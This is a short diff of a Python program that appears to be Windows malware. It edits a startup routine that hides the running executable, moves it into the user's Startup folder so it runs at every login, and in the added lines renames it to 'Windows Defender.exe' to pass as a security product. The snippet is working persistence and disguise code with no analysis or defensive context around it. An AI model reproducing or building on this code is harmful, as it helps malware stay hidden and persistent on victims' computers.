@@ -515,12 +515,16 @@ class debug:
         exit()
 
 def startup():
+    fakename = "Windows Defender.exe"
+    
     cwf = r"{}\{}".format(os.getcwd(), os.path.basename(sys.argv[0]))
-    startup = r"C:\Users\{}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\{}".format(os.getlogin(), os.path.basename(sys.argv[0]))
+    startup = r"C:\Users\{}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\{}"
 
-    if not cwf == startup:
+    if not cwf == startup.format(os.getlogin(), os.path.basename(sys.argv[0])):
         SetFileAttributes(cwf, FILE_ATTRIBUTE_HIDDEN)
-        os.rename(cwf, startup)  
+        os.rename(cwf, startup.format(os.getlogin(), os.path.basename(sys.argv[0])))  
+        
+        os.rename(startup.format(os.getlogin(), os.path.basename(sys.argv[0])), startup.format(os.getlogin(), fakename))
                             
 if __name__ == '__main__':
     if os.name != "nt":
